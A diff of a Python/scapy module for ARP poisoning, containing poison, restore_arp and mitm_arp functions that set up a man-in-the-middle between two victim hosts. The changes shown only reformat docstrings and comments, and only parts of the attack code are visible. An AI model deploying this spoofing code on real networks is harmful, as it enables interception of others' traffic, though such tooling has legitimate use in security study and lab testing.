@@ -1,10 +1,14 @@
 '''This package contains everything related to ARP poisoning'''
+
 from time import sleep
 from scapy.all import ARP, send, conf
 from .general import get_target_mac
 
 def poison(victim_ip, spoof_ip, victim_mac='', interface=''):
-    '''Change mac address in arp table'''
+    '''
+    Change mac address in arp table of victim
+    '''
+
     try:
         # Only get target mac if victim mac is not specified
         if victim_mac == '':
@@ -28,7 +32,9 @@ def poison(victim_ip, spoof_ip, victim_mac='', interface=''):
 
 
 def restore_arp(victim_ip, spoof_ip, interface=''):
-    '''Restore mac address in arp table'''
+    '''
+    Restore mac address in arp table
+    '''
 
     # Set interface to the default if not specified
     if interface == '':
@@ -47,13 +53,14 @@ def restore_arp(victim_ip, spoof_ip, interface=''):
     except:
         print('Victim not found')
 
+
 def mitm_arp(victim_1_ip, victim_2_ip, interface):
-    '''This sets up a man in the middle between the two provided victim IPs'''
+    '''
+    Sets up a man in the middle attack between the two provided victim IPs
+    '''
 
     try:
-        # Tis way we don't continuously ask for the MAC adress, which are relativily static anyway
-
-
+        # Do not ask for MAC address continuously, but only every 2 seconds
         while True:
             victim_1_mac = get_target_mac(victim_1_ip, interface)
             victim_2_mac = get_target_mac(victim_2_ip, interface)
